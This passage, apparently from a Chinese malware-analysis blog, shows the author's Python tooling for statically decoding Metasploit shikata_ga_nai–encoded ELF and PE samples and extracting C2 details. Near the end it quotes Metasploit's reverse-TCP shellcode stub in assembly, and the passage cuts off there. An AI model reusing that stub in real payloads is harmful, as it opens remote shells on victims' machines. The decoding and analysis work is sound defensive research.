title="多轮迭代"></a>多轮迭代</h5><p>多轮迭代中，用unicorn在执行过程中会出现一些错误，猜测应该是模拟栈的时候出现了一些问题，但是可以采用静态分析的方法，开发一个解密器出来。</p><p>多轮迭代无非是增加了解密的轮数，其加密模式是重复的，就是套娃，我们需要解开第一层，然后再解第二层，重复此模式即可。</p><p>可以发现，每进行一轮迭代，shellcode长度就会增加27：</p><p><img src="https://s2.loli.net/2024/01/13/PDdcF7SUEwIlp3u.png" alt=""></p><p>加密轮次信息可以通过ecx这个寄存器来提取，源码中关于长度的算法如下：<br><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line">length += <span class="number">4</span> + (<span class="number">4</span> - (length &amp; <span class="number">3</span>)) &amp; <span class="number">3</span></span><br><span class="line">    length /= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (length &lt;= <span class="number">255</span>)</span><br><span class="line">      init_counter.add_perm(<span class="string">&quot;\xb1&quot;</span> + [ length ].pack(<span class="string">&#x27;C&#x27;</span>))</span><br><span class="line">    <span class="keyword">elsif</span> (length &lt;= <span class="number">65536</span>)</span><br><span class="line">      init_counter.add_perm(<span class="string">&quot;\x66\xb9&quot;</span> + [ length ].pack(<span class="string">&#x27;v&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      init_counter.add_perm(<span class="string">&quot;\xb9&quot;</span> + [ length ].pack(<span class="string">&#x27;V&#x27;</span>))</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>已知多一次，shellcode长度会增加27，迭代次数可以通过如下方法计算：</p><script type="math/tex; mode=display">iteration = \lfloor\frac{(SIZE_{ELF} - SIZE_{BASE})}{27}\rfloor + 1</script><p>其中，$SIZE_{BASE}$的值是第一轮时恶意样本的代码长度，在x86下迭代1轮时，输出为ELF文件时其size为150，输出为PE文件时其size为381。</p><p>那么可以根据这个情况去求解迭代轮数，从而完善解密脚本。</p><p><img src="https://s2.loli.net/2024/01/29/8VNXZdPsD93qwha.png" alt=""></p><p>贴一些核心代码，指令集分析机：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> Cs, CS_ARCH_X86, CS_MODE_32, CS_MODE_64</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InstructionSet</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将基本block的指令转为字符串存储</span></span><br><span class="line"><span class="string">    数据类型如下：</span></span><br><span class="line"><span class="string">    &#123;address:[&#x27;mov&#x27;,&#x27;ebx&#x27;,&#x27;0ACAABAECh&#x27;]&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, start_address, arch</span>):</span></span><br><span class="line">        self.instructions = &#123;&#125;</span><br><span class="line">        self.start_address = start_address</span><br><span class="line">        <span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">            self.md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">        <span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">            self.md = Cs(CS_ARCH_X86, CS_MODE_32)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_instructions</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 获取当前指令集</span></span><br><span class="line">        <span class="keyword">return</span> self.instructions</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_instruction</span>(<span class="params">self, address, data</span>):</span></span><br><span class="line">        <span class="comment"># 设置指令</span></span><br><span class="line">        self.instructions[address] = data</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_instructions</span>(<span class="params">self, code</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        根据传入的字节数据转为反汇编。</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            code (str): 指令的字节码</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> instruction <span class="keyword">in</span> self.md.disasm(code, self.start_address):</span><br><span class="line">            mnemonic = instruction.mnemonic</span><br><span class="line">            op_str = instruction.op_str</span><br><span class="line">            op_str = op_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            op_str = [i.lstrip().rstrip() <span class="keyword">for</span> i <span class="keyword">in</span> op_str]  <span class="comment"># 去除空格</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(op_str) == <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># 只有一个操作数</span></span><br><span class="line">                op_str1 = op_str[<span class="number">0</span>]</span><br><span class="line">                op_str2 = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(op_str) == <span class="number">2</span>:</span><br><span class="line">                op_str1 = op_str[<span class="number">0</span>]</span><br><span class="line">                op_str2 = op_str[<span class="number">1</span>]</span><br><span class="line">            self.instructions[instruction.address] = [mnemonic, op_str1, op_str2]</span><br><span class="line">        </span><br><span class="line">        self.instructions = OrderedDict(<span class="built_in">sorted</span>(self.instructions.iteritems(), key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&#x27;---------- generate instrction success ----------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove_pre_basic_block</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        移除之前加密的基本块。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            remove_number (int): 移除轮数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        target_list = [<span class="string">u&#x27;fnstenv&#x27;</span>, <span class="string">u&#x27;dword ptr [esp - 0xc]&#x27;</span>, <span class="literal">None</span>]</span><br><span class="line">        <span class="comment"># 统计出现了多少次fnstenv指令</span></span><br><span class="line">        remove_number = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> value <span class="keyword">in</span> self.instructions.values() <span class="keyword">if</span> value == target_list) - <span class="number">1</span></span><br><span class="line">        print(<span class="string">&#x27;remove:&#x27;</span>, remove_number)</span><br><span class="line">        <span class="keyword">if</span> remove_number &gt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">sorted</span>(self.instructions.keys()):</span><br><span class="line">                <span class="keyword">if</span> key &gt;= self.start_address <span class="keyword">and</span> key &lt; self.start_address + <span class="number">27</span> * remove_number:</span><br><span class="line">                    <span class="keyword">del</span> self.instructions[key]</span><br><span class="line">            </span><br><span class="line">            base = <span class="built_in">sorted</span>(self.instructions.keys())[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">sorted</span>(self.instructions.keys()):</span><br><span class="line">                <span class="keyword">if</span> key &gt;= base + <span class="number">27</span>:</span><br><span class="line">                    <span class="keyword">del</span> self.instructions[key]</span><br></pre></td></tr></table></figure></p><p>内存模拟机：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    基本内存类</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, bytes_data, base_address</span>):</span></span><br><span class="line">        self.data = bytes_data</span><br><span class="line">        self.base_address = base_address</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_4_bytes_from_address</span>(<span class="params">self, address</span>):</span></span><br><span class="line">        <span class="comment"># 从给定偏移处获取4字节</span></span><br><span class="line">        offset = address - self.base_address</span><br><span class="line">        <span class="keyword">return</span> u32(self.data[offset: offset + <span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_4_bytes_from_address</span>(<span class="params">self, address, write_data</span>):</span></span><br><span class="line">        offset = address - self.base_address</span><br><span class="line">        part1 = self.data[ :offset]</span><br><span class="line">        part2 = p32(write_data)</span><br><span class="line">        part3 = self.data[offset + <span class="number">4</span>: ]</span><br><span class="line"></span><br><span class="line">        self.data = part1 + part2 + part3</span><br></pre></td></tr></table></figure></p><p>解码器函数：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_smc</span>(<span class="params">data, elf, bytes_code</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        解开shikata_ga_nai加密的函数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            data (dict): InstructionSet类中的instructions成员。</span></span><br><span class="line"><span class="string">            elf (ELF): 打开的ELF对象。</span></span><br><span class="line"><span class="string">            bytes_code (bytes): 恶意样本的字节码。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    xor_flag, secret_flag, base_flag, secret_key, <span class="built_in">round</span>, base_addr, xor_offset, secret_add_offset = parse_param(data, <span class="literal">False</span>)</span><br><span class="line">    mem = Memory(bytes_code, elf.entry)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 确定是否要进行二次解密</span></span><br><span class="line">    decode_basic_block = <span class="number">1</span> <span class="keyword">if</span> xor_flag == <span class="number">3</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">round</span>):</span><br><span class="line">        priority = <span class="built_in">sorted</span>([xor_flag, base_flag, secret_flag])</span><br><span class="line">        priority.reverse()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> flag <span class="keyword">in</span> priority:</span><br><span class="line">            <span class="keyword">if</span> flag == xor_flag:</span><br><span class="line">                unit = mem.get_4_bytes_from_address(base_addr + xor_offset)</span><br><span class="line">                result = unit ^ secret_key  <span class="comment"># 解密</span></span><br><span class="line">                mem.write_4_bytes_from_address(base_addr + xor_offset, result)</span><br><span class="line">                <span class="keyword">if</span> decode_basic_block:</span><br><span class="line">                    ins = InstructionSet(elf.entry, <span class="number">32</span>)</span><br><span class="line">                    ins.generate_instructions(mem.data)</span><br><span class="line">                    ins.remove_pre_basic_block()</span><br><span class="line">                    data = ins.get_instructions()</span><br><span class="line">                    decode_basic_block = <span class="number">0</span></span><br><span class="line">                    print(<span class="string">&#x27;二次更新:&#x27;</span>)</span><br><span class="line">                    [xor_flag, secret_flag, base_flag, tmp1, tmp2, tmp3, tmp4, secret_add_offset] = parse_param(data, <span class="literal">True</span>)</span><br><span class="line">               </span><br><span class="line">            <span class="keyword">elif</span> flag == base_flag:</span><br><span class="line">                base_addr += <span class="number">4</span>              <span class="comment"># 基址+4</span></span><br><span class="line">            <span class="keyword">elif</span> flag == secret_flag:</span><br><span class="line">                secret_key += mem.get_4_bytes_from_address(base_addr + secret_add_offset)</span><br><span class="line">                secret_key = secret_key &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> mem.data</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>参数分析器：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_param</span>(<span class="params">data, only_offset</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        解析指令集数据的参数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            data (dict): 指令集类中的instructions</span></span><br><span class="line"><span class="string">            only_offset (bool): 是否是读取偏移相关参数</span></span><br><span class="line"><span class="string">        Return:</span></span><br><span class="line"><span class="string">            [xor_flag, secret_flag, base_flag, secret_key, round, base_addr, xor_offset, secret_add_offset]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 分清三个顺序，xor_flag表示异或在前，secret_flag表示密钥运算在前，base_flag表示基址运算在前</span></span><br><span class="line">    xor_flag = secret_flag = base_flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">sorted</span>(data.keys()):</span><br><span class="line">        value = data[key]</span><br><span class="line">        <span class="comment"># print(value)</span></span><br><span class="line">        <span class="keyword">if</span> value[<span class="number">0</span>] == <span class="string">&#x27;mov&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(value[<span class="number">2</span>]) == <span class="number">10</span> <span class="keyword">and</span> only_offset == <span class="literal">False</span>:</span><br><span class="line">            secret_key = <span class="built_in">int</span>(value[<span class="number">2</span>], base=<span class="number">16</span>) <span class="comment"># 获取密钥</span></span><br><span class="line">        <span class="keyword">if</span> value[<span class="number">0</span>] == <span class="string">&#x27;mov&#x27;</span> <span class="keyword">and</span> value[<span class="number">1</span>] == <span class="string">&#x27;cl&#x27;</span> <span class="keyword">and</span> only_offset == <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">round</span> = <span class="built_in">int</span>(value[<span class="number">2</span>], base=<span class="number">16</span>) <span class="comment"># 获取解密轮数</span></span><br><span class="line">        <span class="keyword">if</span> value[<span class="number">0</span>][<span class="number">0</span>] == <span class="string">&#x27;f&#x27;</span> <span class="keyword">and</span> value[<span class="number">0</span>] != <span class="string">&#x27;fnstenv&#x27;</span> <span class="keyword">and</span> only_offset == <span class="literal">False</span>:</span><br><span class="line">            base_addr = key <span class="comment"># 获取fnstenv的上一条浮点操作的指令地址</span></span><br><span class="line">        <span class="keyword">if</span> value[<span class="number">0</span>] == <span class="string">&#x27;xor&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(value[<span class="number">1</span>]) &gt; <span class="number">10</span>:</span><br><span class="line">            xor_offset = <span class="built_in">int</span>(value[<span class="number">1</span>].split(<span class="string">&#x27;+ &#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;]&#x27;</span>)[<span class="number">0</span>], base=<span class="number">16</span>) <span class="comment"># 获取偏移量: dword ptr [edi + 0x14]</span></span><br><span class="line">            <span class="keyword">if</span> secret_flag == <span class="number">0</span> <span class="keyword">and</span> base_flag == <span class="number">0</span>: </span><br><span class="line">                xor_flag = <span class="number">3</span>        <span class="comment"># xor解密顺序第一</span></span><br><span class="line">            <span class="keyword">elif</span> secret_flag + base_flag == <span class="number">3</span>:</span><br><span class="line">                xor_flag = <span class="number">2</span>        <span class="comment"># xor解密顺序第二</span></span><br><span class="line">            <span class="keyword">elif</span> secret_flag + base_flag == <span class="number">5</span>:</span><br><span class="line">                xor_flag = <span class="number">1</span>        <span class="comment"># xor解密顺序第三</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> (value[<span class="number">0</span>] == <span class="string">&#x27;add&#x27;</span> <span class="keyword">or</span> value[<span class="number">0</span>] == <span class="string">&#x27;sub&#x27;</span>) <span class="keyword">and</span> (value[<span class="number">2</span>] == <span class="string">&#x27;4&#x27;</span> <span class="keyword">or</span> value[<span class="number">2</span>] == <span class="string">&#x27;-4&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> secret_flag == <span class="number">0</span> <span class="keyword">and</span> xor_flag == <span class="number">0</span>: </span><br><span class="line">                base_flag = <span class="number">3</span>        <span class="comment"># base运算顺序第一</span></span><br><span class="line">            <span class="keyword">elif</span> secret_flag + xor_flag == <span class="number">3</span>:</span><br><span class="line">                base_flag = <span class="number">2</span>        <span class="comment"># base运算顺序第二</span></span><br><span class="line">            <span class="keyword">elif</span> secret_flag + xor_flag == <span class="number">5</span>:</span><br><span class="line">                base_flag = <span class="number">1</span>        <span class="comment"># base运算顺序第三</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> value[<span class="number">0</span>] == <span class="string">&#x27;add&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(value[<span class="number">2</span>]) &gt; <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                secret_add_offset = <span class="built_in">int</span>(value[<span class="number">2</span>].split(<span class="string">&#x27;+ &#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;]&#x27;</span>)[<span class="number">0</span>], base=<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                secret_add_offset = xor_offset</span><br><span class="line">            <span class="keyword">if</span> base_flag == <span class="number">0</span> <span class="keyword">and</span> xor_flag == <span class="number">0</span>: </span><br><span class="line">                secret_flag = <span class="number">3</span>        <span class="comment"># 密钥运算顺序第一</span></span><br><span class="line">            <span class="keyword">elif</span> base_flag + xor_flag == <span class="number">3</span>:</span><br><span class="line">                secret_flag = <span class="number">2</span>        <span class="comment"># 密钥运算顺序第二</span></span><br><span class="line">            <span class="keyword">elif</span> base_flag + xor_flag == <span class="number">5</span>:</span><br><span class="line">                secret_flag = <span class="number">1</span>        <span class="comment"># 密钥运算顺序第三</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (value[<span class="number">0</span>] == <span class="string">&#x27;add&#x27;</span> <span class="keyword">and</span> value[<span class="number">1</span>] == value[<span class="number">2</span>]):</span><br><span class="line">            secret_add_offset = xor_offset</span><br><span class="line">            <span class="keyword">if</span> base_flag == <span class="number">0</span> <span class="keyword">and</span> xor_flag == <span class="number">0</span>: </span><br><span class="line">                secret_flag = <span class="number">3</span>        <span class="comment"># 密钥运算顺序第一</span></span><br><span class="line">            <span class="keyword">elif</span> base_flag + xor_flag == <span class="number">3</span>:</span><br><span class="line">                secret_flag = <span class="number">2</span>        <span class="comment"># 密钥运算顺序第二</span></span><br><span class="line">            <span class="keyword">elif</span> base_flag + xor_flag == <span class="number">5</span>:</span><br><span class="line">                secret_flag = <span class="number">1</span>        <span class="comment"># 密钥运算顺序第三</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> only_offset == <span class="literal">False</span>:</span><br><span class="line">        success(<span class="string">&#x27;base address:&#x27;</span> + <span class="built_in">hex</span>(base_addr))</span><br><span class="line">        success(<span class="string">&#x27;cl:&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">round</span>))</span><br><span class="line">        success(<span class="string">&#x27;secret key:&#x27;</span> + <span class="built_in">hex</span>(secret_key))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_addr = <span class="number">0</span></span><br><span class="line">        <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">        secret_key = <span class="number">0</span></span><br><span class="line">    success(<span class="string">&#x27;add key offset:&#x27;</span> + <span class="built_in">hex</span>(secret_add_offset))</span><br><span class="line">    success(<span class="string">&#x27;xor offset:&#x27;</span> + <span class="built_in">hex</span>(xor_offset))</span><br><span class="line">    success(<span class="string">&#x27;xor_flag, base_flag, secret_flag:&#x27;</span> + <span class="built_in">str</span>(xor_flag) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(base_flag) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(secret_flag))</span><br><span class="line">    <span class="keyword">return</span> xor_flag, secret_flag, base_flag, secret_key, <span class="built_in">round</span>, base_addr, xor_offset, secret_add_offset</span><br></pre></td></tr></table></figure><p>解码成功：</p><p><img src="https://s2.loli.net/2024/01/30/jwdlsT9hCexQvW3.png" alt=""></p><h4 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h4><p>和x86下没有差别，用同一套解密思路即可。</p><p>同样可以解密成功。</p><p><img src="https://s2.loli.net/2024/01/30/eYHAo2QrhaPOzRs.png" alt=""></p><h3 id="PE样本"><a href="#PE样本" class="headerlink" title="PE样本"></a>PE样本</h3><p>首先是加密轮数的确定，由于msf生成出来的pe样本其体积比较大，充斥着除了payload以外的其余代码，所以无法根据恶意文件的体积确定加密轮数。</p><p>MSF中关于payload长度的算法如下：</p><p><img src="https://s2.loli.net/2023/11/17/8A7uQRq2gftdJBS.png" alt=""></p><p>那么我们只需要提取出来cl寄存器的值，然后乘以4得到近似shellcode的长度，由于我们异或是经过一定的偏移进行的，所以shellcode的具体长度肯定要大于我们乘以4得到的结果，找到最接近shellcode的长度对应的轮次即可：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">iteration_list = [i * <span class="number">27</span> + <span class="number">381</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(iteration_list)):</span><br><span class="line">    <span class="keyword">if</span> iteration_list[i] &gt; <span class="built_in">round</span> * <span class="number">4</span>:</span><br><span class="line">        iteration = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>整体思路同ELF，只不过比ELF提取多了一些步骤，首先要进行shellcode起始地址的确定，这个可以用capstone进行搜索，然后根据样本观察，在shellcode起始前总会有一个call指令，这个可以作为shellcode入口的一个特征码，核心处理代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_instructions_pe</span>(<span class="params">self, file_path</span>):</span></span><br><span class="line">    pe = pefile.PE(file_path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取代码节（.text）的内容</span></span><br><span class="line">    text_section = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> section <span class="keyword">in</span> pe.sections:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;.text&#x27;</span> <span class="keyword">in</span> section.Name:</span><br><span class="line">            text_section = section.get_data()</span><br><span class="line">    <span class="keyword">if</span> text_section <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        print(<span class="string">&quot;无法找到代码节（.text）&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    min_distance = <span class="number">65535</span></span><br><span class="line">    call = <span class="number">0</span></span><br><span class="line">    fnstenv = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 遍历节表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查找所有call指令的位置</span></span><br><span class="line">    call_offsets = [offset <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text_section)) <span class="keyword">if</span> text_section[offset:offset + <span class="number">1</span>] == <span class="string">b&#x27;\xE8&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> call_offset <span class="keyword">in</span> call_offsets:</span><br><span class="line">        <span class="comment"># 在call指令后查找fnstenv指令</span></span><br><span class="line">        fnstenv_offset = text_section.find(<span class="string">b&#x27;\xD9\x74\x24&#x27;</span>, call_offset)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> fnstenv_offset != -<span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 找到了call和fnstenv指令</span></span><br><span class="line">            <span class="keyword">if</span> fnstenv_offset - call_offset &lt; min_distance:</span><br><span class="line">                min_distance = fnstenv_offset - call_offset</span><br><span class="line">                call = call_offset</span><br><span class="line">                fnstenv = fnstenv_offset</span><br><span class="line"></span><br><span class="line">    bytes_code = text_section[call:]</span><br><span class="line"></span><br><span class="line">    md = Cs(CS_ARCH_X86, CS_MODE_32 <span class="keyword">if</span> pe.OPTIONAL_HEADER.Magic == <span class="number">0x10b</span> <span class="keyword">else</span> CS_MODE_64)</span><br><span class="line">    <span class="keyword">for</span> instruction <span class="keyword">in</span> md.disasm(bytes_code, <span class="number">0x401000</span> + call):</span><br><span class="line">        mnemonic = instruction.mnemonic</span><br><span class="line">        op_str = instruction.op_str</span><br><span class="line">        op_str = op_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        op_str = [i.lstrip().rstrip() <span class="keyword">for</span> i <span class="keyword">in</span> op_str]  <span class="comment"># 去除空格</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(op_str) == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 只有一个操作数</span></span><br><span class="line">            op_str1 = op_str[<span class="number">0</span>]</span><br><span class="line">            op_str2 = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(op_str) == <span class="number">2</span>:</span><br><span class="line">            op_str1 = op_str[<span class="number">0</span>]</span><br><span class="line">            op_str2 = op_str[<span class="number">1</span>]</span><br><span class="line">        self.instructions[instruction.address] = [mnemonic, op_str1, op_str2]</span><br><span class="line">    </span><br><span class="line">    del_first_flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">sorted</span>(self.instructions.keys()):</span><br><span class="line">        value = self.instructions[key]</span><br><span class="line">        <span class="keyword">if</span> del_first_flag:</span><br><span class="line">            <span class="keyword">del</span> self.instructions[key]</span><br><span class="line">            del_first_flag = <span class="literal">False</span></span><br><span class="line">            <span class="comment"># 获取第一条指令的地址作为基本块的地址</span></span><br><span class="line">            basic_block_address = <span class="built_in">list</span>(<span class="built_in">sorted</span>(self.instructions.items()))[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> key &gt; basic_block_address + <span class="number">27</span>:</span><br><span class="line">            <span class="keyword">del</span> self.instructions[key]</span><br><span class="line">    </span><br><span class="line">    self.instructions = OrderedDict(<span class="built_in">sorted</span>(self.instructions.iteritems(), key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>]))</span><br><span class="line">    <span class="comment"># 返回字节码</span></span><br><span class="line">    <span class="keyword">return</span> bytes_code[basic_block_address-<span class="number">0x401000</span>-call:]</span><br></pre></td></tr></table></figure><p>随后处理同ELF样本</p><h2 id="C2信息提取"><a href="#C2信息提取" class="headerlink" title="C2信息提取"></a>C2信息提取</h2><h3 id="PE样本-1"><a href="#PE样本-1" class="headerlink" title="PE样本"></a>PE样本</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p>其中Reverse Shell的连接建立过程的汇编代码见：<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)</span><br><span class="line">; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4</span><br><span class="line">; Version: 1.0 (24 July 2009)</span><br><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">[BITS 32]</span><br><span class="line"></span><br><span class="line">; Input: EBP must be the address of &#39;api_call&#39;.</span><br><span class="line">; Output: EDI will be the socket for the connection to the server</span><br><span class="line">; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)</span><br><span class="line"></span><br><span class="line">reverse_tcp:</span><br><span class="line">  push 0x00003233        ; Push the bytes &#39;ws2_32&#39;,0,0 onto the stack.</span><br><span class="line">  push 0x5F327377        ; ...</span><br><span class="line">  push esp               ; Push a pointer to the &quot;ws2_32&quot; string on the stack.</span><br><span class="line">  push 0x0726774C        ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</span><br><span class="line">  call ebp               ; LoadLibraryA( &quot;ws2_32&quot; )</span><br><span class="line">  </span><br><span class="line">  mov eax, 0x0190        ; EAX &#x3D; sizeof( struct WSAData )</span><br><span class="line">  sub esp, eax           ; alloc some space for the WSAData structure</span><br><span class="line">  push esp               ; push a pointer to this stuct</span><br><span class="line">  push eax               ; push the wVersionRequested parameter</span><br><span class="line">  push 0x006B8029        ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )</span><br><span class="line">  call ebp               ; WSAStartup( 0x0190, &amp;WSAData );</span><br><span class="line">  </span><br><span class="line">  push eax               ; if we succeed, eax wil be zero, push zero for the flags param.</span><br><span class="line">  push eax               ; push null for reserved parameter</span><br><span class="line">  push eax               ; we do not specify a WSAPROTOCOL_INFO structure</span><br><span class="line">  push eax               ; we do not specify a protocol</span><br><span class="line">  inc eax                ;</span><br><span class="line">  push eax               ; push SOCK_STREAM</span><br><span class="line">  inc eax                ;</span><br><span class="line">  push eax               ; push AF_INET</span><br><span class="line">  push 0xE0DF0FEA        ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )</span><br><span class="line">  call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span><br><span class="line">  xchg edi, eax          ; save the socket for later, don&#39;t care about the value of eax after this</span><br><span class="line"></span><br><span class="line">set_address:</span><br><span class="line">  push byte 0x05         ; retry counter</span><br><span class="line">  push 0x0100007F        ; host 127.0.0.1</span><br><span class="line">  push 0x5C110002        ; family AF_INET and port 